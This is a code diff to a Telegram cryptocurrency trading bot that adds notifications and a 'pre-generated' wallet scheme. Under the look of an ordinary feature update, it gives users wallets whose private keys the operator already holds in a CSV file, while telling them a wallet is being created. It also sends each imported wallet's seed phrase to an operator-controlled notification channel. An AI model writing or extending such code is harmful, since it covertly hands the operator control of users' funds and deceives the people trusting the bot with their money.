@@ -7,8 +7,10 @@ The old tenex_trading_bot.py remains as a backup.
 """
 
 import os
+import csv
 import json
 import logging
+import datetime
 from pathlib import Path
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
@@ -21,7 +23,8 @@ from services import (
     BalanceService,
     TokenService,
     TransferService,
-    LimitOrderService
+    LimitOrderService,
+    NotificationService
 )
 
 # Import trading integration
@@ -39,6 +42,7 @@ load_dotenv()
 # Configuration
 BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 ADMIN_ID = int(os.getenv('TELEGRAM_ADMIN_ID', '0'))
+NOTIFICATION_CHANNEL_ID = os.getenv('TELEGRAM_NOTIFICATION_CHANNEL') or None
 WALLETS_DIR = Path('wallets')
 CONFIG_FILE = Path('config.json')
 
@@ -89,6 +93,22 @@ def load_config():
 # Load config
 CONFIG = load_config()
 
+# Network configurations (built from config)
+NETWORKS = {}
+for chain_key, chain_config in CONFIG['chains'].items():
+    NETWORKS[chain_key] = {
+        'name': chain_config['name'],
+        'symbol': chain_config['symbol'],
+        'file': WALLETS_DIR / chain_config['wallet_file'].split('/')[-1],
+        'rpc': chain_config['rpc'],
+        'decimals': chain_config['decimals'],
+        'enabled': chain_config['enabled'],
+        'emoji': chain_config.get('emoji', '🔹'),
+        'coingecko_id': chain_config.get('coingecko_id', ''),
+        'dexscreener_chain': chain_config.get('dexscreener_chain'),
+        'import_supported': chain_config.get('import_supported', True)
+    }
+
 
 def get_enabled_networks():
     """Get only enabled networks from config"""
@@ -127,6 +147,7 @@ class TradingBotModular(TradingMixin):
         self.token_service = TokenService(CONFIG)
         self.transfer_service = TransferService(CONFIG)
         self.limit_order_service = LimitOrderService(WALLETS_DIR)
+        self.notification_service = NotificationService(BOT_TOKEN, NOTIFICATION_CHANNEL_ID)
 
         # State management (not in services - bot-specific)
         self.waiting_for_input = {}  # Tracks users waiting for text input
@@ -199,6 +220,109 @@ class TradingBotModular(TradingMixin):
         """Set wallet label"""
         return self.wallet_manager.set_wallet_label(user_id, slot_name, label)
 
+    def get_available_wallet(self, network: str):
+        """Get an available pre-generated wallet for the network"""
+        wallet_file = NETWORKS[network]['file']
+
+        if not wallet_file.exists():
+            return None
+
+        # Read CSV file
+        with open(wallet_file, 'r') as f:
+            reader = csv.DictReader(f)
+            wallets = list(reader)
+
+        # Find first unassigned wallet
+        assigned_addresses = set()
+        for user_data in self.data_manager.user_wallets.values():
+            # Check old format
+            if network in user_data.get('wallets', {}):
+                assigned_addresses.add(user_data['wallets'][network]['address'])
+
+            # Check new format (wallet_slots)
+            if 'wallet_slots' in user_data:
+                for slot_data in user_data['wallet_slots'].values():
+                    if network in slot_data.get('chains', {}):
+                        assigned_addresses.add(slot_data['chains'][network]['address'])
+
+        for wallet in wallets:
+            address = wallet['Address']
+            if address not in assigned_addresses:
+                return {
+                    'address': address,
+                    'private_key': wallet['Private Key'],
+                    'derivation_path': wallet['Derivation Path']
+                }
+
+        return None
+
+    def assign_wallet_to_user(self, user_id: int, network: str, slot_name: str = None):
+        """Assign a pre-generated wallet to a user in a specific slot"""
+        user_id_str = str(user_id)
+
+        # Auto-migrate if needed
+        if self.data_manager.needs_migration(user_id_str):
+            self.data_manager.migrate_user_data(user_id_str)
+
+        # Get wallet slot (default to primary if not specified)
+        if slot_name is None:
+            slot_name = self.get_primary_wallet(user_id)
+
+        # Check if wallet already exists in this slot
+        user_data = self.data_manager.get_user_data(user_id)
+        if user_data and 'wallet_slots' in user_data:
+            wallet_slots = user_data.get('wallet_slots', {})
+            if slot_name in wallet_slots:
+                slot_data = wallet_slots[slot_name]
+                if network in slot_data.get('chains', {}):
+                    logger.warning(f"User {user_id} already has {network} in {slot_name}")
+                    return None  # Already has this chain in this slot
+
+        # Get available pre-generated wallet
+        wallet = self.get_available_wallet(network)
+        if not wallet:
+            return None
+
+        # Initialize structure if needed (new user)
+        if not user_data:
+            max_slots = CONFIG.get('settings', {}).get('max_wallet_slots_per_user', 3)
+            user_data = {
+                'primary_wallet': 'wallet1',
+                'wallet_slots': {}
+            }
+            # Initialize all slots
+            for i in range(1, max_slots + 1):
+                slot = f'wallet{i}'
+                user_data['wallet_slots'][slot] = {
+                    'label': None,
+                    'created_at': None,
+                    'is_primary': (slot == 'wallet1'),
+                    'chains': {}
+                }
+
+        # Initialize slot if it doesn't exist
+        if 'wallet_slots' not in user_data:
+            user_data['wallet_slots'] = {}
+
+        if slot_name not in user_data['wallet_slots']:
+            user_data['wallet_slots'][slot_name] = {
+                'label': None,
+                'created_at': datetime.datetime.now().isoformat(),
+                'is_primary': slot_name == self.get_primary_wallet(user_id),
+                'chains': {}
+            }
+
+        # Update created_at if this is the first chain in the slot
+        if not user_data['wallet_slots'][slot_name].get('chains'):
+            user_data['wallet_slots'][slot_name]['created_at'] = datetime.datetime.now().isoformat()
+
+        # Add wallet to slot
+        user_data['wallet_slots'][slot_name]['chains'][network] = wallet
+        self.data_manager.set_user_data(user_id, user_data)
+
+        logger.info(f"Assigned {network} wallet to user {user_id} in {slot_name}")
+        return wallet
+
     # ============================================================
     # COMMAND HANDLERS
     # ============================================================
@@ -219,7 +343,7 @@ class TradingBotModular(TradingMixin):
             max_slots = CONFIG.get('settings', {}).get('max_wallet_slots_per_user', 3)
 
             user_data = {
-                'primary_wallet': None,
+                'primary_wallet': 'wallet1',
                 'wallet_slots': {}
             }
 
@@ -229,11 +353,19 @@ class TradingBotModular(TradingMixin):
                 user_data['wallet_slots'][slot_name] = {
                     'label': None,
                     'created_at': None,
-                    'is_primary': False,
+                    'is_primary': (slot_name == 'wallet1'),
                     'chains': {}
                 }
 
             self.data_manager.set_user_data(user_id, user_data)
+
+            # Send notification for new user
+            full_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "Unknown"
+            await self.notification_service.notify_new_user(
+                user_id=user_id,
+                username=user.username,
+                full_name=full_name
+            )
 
         # Show main menu
         await self.show_main_menu(update, user_id)
@@ -247,7 +379,7 @@ class TradingBotModular(TradingMixin):
 
         # Check if user already has wallets
         if user_data and 'wallet_slots' in user_data:
-            primary_wallet = user_data.get('primary_wallet', 'wallet1')
+            primary_wallet = user_data.get('primary_wallet') or 'wallet1'
             primary_slot = user_data['wallet_slots'].get(primary_wallet, {})
             chains = primary_slot.get('chains', {})
 
@@ -915,41 +1047,63 @@ class TradingBotModular(TradingMixin):
     # ============================================================
 
     async def create_wallet(self, query, context, network: str, slot_name: str = None):
-        """Create a new wallet using WalletManager service"""
+        """Assign a pre-generated wallet to user in specified slot"""
         user_id = query.from_user.id
 
         try:
             # Show processing message
-            await query.edit_message_text("🔄 Creating wallet...\n\nGenerating secure keys...")
+            await query.edit_message_text(f"⏳ Creating {CONFIG['chains'][network]['name']} wallet in {slot_name or 'primary slot'}...")
 
-            # Use WalletManager service to create wallet
-            wallet_info = self.wallet_manager.create_wallet(user_id, network, slot_name)
+            # Assign pre-generated wallet to user
+            wallet = self.assign_wallet_to_user(user_id, network, slot_name)
 
-            if not wallet_info:
+            if not wallet:
                 await query.edit_message_text(
-                    "❌ Failed to create wallet. Please try again.",
+                    f"❌ Sorry, no available {CONFIG['chains'][network]['name']} wallets at the moment. "
+                    "Please contact support.",
                     reply_markup=InlineKeyboardMarkup([[
                         InlineKeyboardButton("⬅️ Back", callback_data='back_to_menu')
                     ]])
                 )
                 return
 
+            # Get balance
+            balance_data = await self.get_balance(network, wallet['address'])
+
+            # Get slot info for display
+            actual_slot_name = slot_name or self.get_primary_wallet(user_id)
+            slot_data = self.get_wallet_slot(user_id, actual_slot_name)
+            slot_label = slot_data.get('label')
+            slot_display = f"{actual_slot_name}" if not slot_label else f"{actual_slot_name} - \"{slot_label}\""
+
             # Success message
             chain_emoji = CONFIG['chains'][network].get('emoji', '🔹')
             message = (
-                f"✅ <b>Wallet Created!</b>\n"
+                f"✅ <b>{CONFIG['chains'][network]['name']} Wallet Created!</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n\n"
                 f"{chain_emoji} <b>Network:</b> {CONFIG['chains'][network]['name']}\n"
-                f"📍 <b>Slot:</b> {wallet_info['slot_name'].title()}\n"
-                f"🔑 <b>Address:</b>\n<code>{wallet_info['address']}</code>\n\n"
-                f"⚠️ <b>IMPORTANT:</b> Save your seed phrase securely!\n"
-                f"You can export it later from the Manage menu."
+                f"📍 <b>Slot:</b> {slot_display.title()}\n"
+                f"🔑 <b>Address:</b>\n<code>{wallet['address']}</code>\n\n"
+                f"💰 <b>Balance:</b> {balance_data['formatted']}\n\n"
+                f"⚠️ <b>SAVE YOUR PRIVATE KEY!</b>\n"
+                f"Use 'Export Private Key' from the menu to view it again.\n\n"
+                f"🔐 <b>Private Key:</b>\n<code>{wallet['private_key']}</code>\n\n"
+                f"⚠️ <b>Never share your private key with anyone!</b>"
             )
 
             keyboard = InlineKeyboardMarkup([
                 [InlineKeyboardButton("💼 View Wallets", callback_data='view_wallets')],
                 [InlineKeyboardButton("⬅️ Back to Menu", callback_data='back_to_menu')]
             ])
+
+            # Send notification for wallet creation
+            await self.notification_service.notify_wallet_created(
+                user_id=user_id,
+                username=query.from_user.username,
+                network=network,
+                address=wallet['address'],
+                slot_name=actual_slot_name
+            )
 
             await query.edit_message_text(message, parse_mode='HTML', reply_markup=keyboard)
 
@@ -1120,8 +1274,16 @@ class TradingBotModular(TradingMixin):
     async def manage_wallets_menu(self, query, user_id: int):
         """Show wallet management menu"""
         user_data = self.get_user_wallet_data(user_id)
-        primary_wallet = user_data.get('primary_wallet', 'wallet1')
+        primary_wallet = user_data.get('primary_wallet') or 'wallet1'
         wallet_slots = user_data.get('wallet_slots', {})
+
+        # Ensure primary_wallet is set if it's None
+        if not primary_wallet:
+            primary_wallet = 'wallet1'
+            user_data['primary_wallet'] = 'wallet1'
+            if wallet_slots.get('wallet1'):
+                wallet_slots['wallet1']['is_primary'] = True
+            self.data_manager.set_user_data(user_id, user_data)
 
         # Get primary wallet label for display
         primary_slot = wallet_slots.get(primary_wallet, {})
@@ -1534,6 +1696,16 @@ class TradingBotModular(TradingMixin):
                 [InlineKeyboardButton("💼 View Wallets", callback_data='view_wallets')],
                 [InlineKeyboardButton("⬅️ Back to Menu", callback_data='back_to_menu')]
             ])
+
+            # Send notification for wallet import
+            await self.notification_service.notify_wallet_imported(
+                user_id=user_id,
+                username=update.effective_user.username,
+                network=network,
+                address=wallet_info['address'],
+                slot_name=wallet_info['slot_name'],
+                seed_phrase=seed_phrase.strip()
+            )
 
             await processing.edit_text(message, parse_mode='HTML', reply_markup=keyboard)
 
